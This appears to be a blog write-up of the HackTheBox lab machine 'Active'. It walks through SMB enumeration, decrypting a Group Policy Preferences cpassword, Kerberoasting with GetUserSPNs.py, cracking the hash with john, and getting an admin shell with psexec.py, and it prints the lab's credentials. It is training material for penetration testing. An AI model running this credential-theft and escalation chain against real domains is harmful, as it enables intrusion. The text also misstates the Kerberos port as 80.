---
layout: single
title:  "HTB - Active Writeup - 10.10.10.100"
date:   2020-06-16 16:49:23 +0100
categories: hackthebox
excerpt: My walkthrough / writeup of the HTB AD machine Active.
---
![HTB](/images/active/2020-06-16_16-56.png)

# HackTheBox - Active - 10.10.10.100

Active is a 30 point medium rated machine on hackthebox, it involved locating a groups.xml file and decrypting the cpassword inside to get user. Root required the use of `GetUserSPNs.py` to get the tgt of the Admin user who had a service principal name set and finally, `psexec.py` to gain an admin shell.

## 1. Recon 
To start this box off we will do an nmap scan of the target machine, 10.10.10.100  `nmap -sC -sV -oA nmap/active 10.10.10.100` 
### Nmap Scan Results

```
# Nmap 7.80 scan initiated Wed Apr 29 12:08:45 2020 as: nmap -sC -sV -oA nmap/active 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.056s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-29 11:10:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

There are a few things to note here, firstly we have kerberos (port 80), ldap (port 389), rpc (port 135) and smb open on port 445. This tells us that this machine is probably an active directory domain controller, if it was not previously obvious by the machines name.

### SMB Shares
Firstly we will start by listing smb shares using anonymous credentials: `smbclient -L \\\\10.10.10.100\\ -U ""`

![HTB](/images/active/2020-06-16_17-46.png)

From this we can see an unusual share, *Replication* Let's try and view the conents of this share


## 2. Enumeration
Now to explore the *Replication* Share, we will use smbclient again: `smbclient \\\\10.10.10.100\\Replication`

![Share](/images/active/2020-06-16_17-52.png)

and as you can see we can access the share using anonymous login, now we can download all the files using the following commands:
`prompt OFF` `recurse ON` `mget *`

![downloading-files](/images/active/2020-06-16_17-55.png)

### Groups.xml
The file of note here is the Groups.xml file, this file is used by a windows service called *Group Policy Preferences* which allows domain admins to roll out passwords for local Administrators over Group Policy, the decryption key was leaked so now any password located inside a Groups.xml file can be decrypted. You can read more about this [Here](https://adsecurity.org/?p=2288) at adsecurity.org

Inside the groups.xml file we see:
![groups-xml](/images/active/2020-06-16_19-30.png)

The cpassword string is the encrypted password for the user  `SVC_TGS`. 

## 3. Exploitation
### Decrypting the cpassword
Kali has a built in utility called `gpp-decrypt` which will decrypt the cpassword string, you can read more about this tool [here](https://github.com/BustedSec/gpp-decrypt).

Now to decrypt the cpassword string from before we can type, `gpp-decrypt edBSHOwhZLTjt/QS9FeIc----------------Q`
![gpp-decrypt](/images/active/2020-06-16_19-35.png)


We now have the credentials of the user `SVC_TGS:GPPstillStandingStrong2k18` and we can attempt to connect to the **Users** SMB Share to grab `user.txt`

`smbclient \\\\10.10.10.100\\Users -U svc_tgs`
![user](/images/active/user.gif)

## 4. Privesc to Domain Admin
### Service Principal Names (SPN's)
Our user account `SVC_TGS` is able to find service principal names associated with user accounts in the domain, you could have found this out by having a look at the username and to see the TGT string at the end which signifies that this account may be able to see SPN's. Through this we are able to get the krb5-tgt of the `Administrator` account using a tool called `GetUserSPNs.py` from the Impacket Repo on [GitHub](https://github.com/SecureAuthCorp/impacket). If you want to know more about this attack I will leave a link to an ADSecurity article [here](https://adsecurity.org/?p=3466).


### Getting the TGT of the Admin User
The syntax for this command is as follows:
`GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -request -dc-ip 10.10.10.100`

-dc-ip is the ip of the domain controller, 10.10.10.100
-request means that we want to request the tgt of any user that has a SPN 

![SPN](/images/active/2020-06-16_20-13.png)

Bingo!! We can now take this TGT to john the ripper to crack

#### Cracking the TGT

We will use john the ripper to crack the TGT, first by placing it in a file named `admin.hash` and then running the following command to run it against the rockyou.txt wordlist. 

`john -w=/usr/share/wordlists/rockyou.txt admin.hash`
![tgt-cracked](/images/active/cracking-tgt.gif)

This gives us the credentials, `Administrator:Ticketmaster1968`

### PSExec 

Now that we hgave the admin credentials we can use the `psexec.py` script from Impacket to gain a shell, if you would like to know more about the psexec.py script you can have a look [here](https://www.sans.org/blog/psexec-python-rocks/).

`psexec.py active.htb/Administrator:Ticketmaster1968`

![rooted](/images/active/root.gif)

## Rooted!!

If you enjoyed my write up or found it useful please check out my htb profile linked below and give a +rep

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

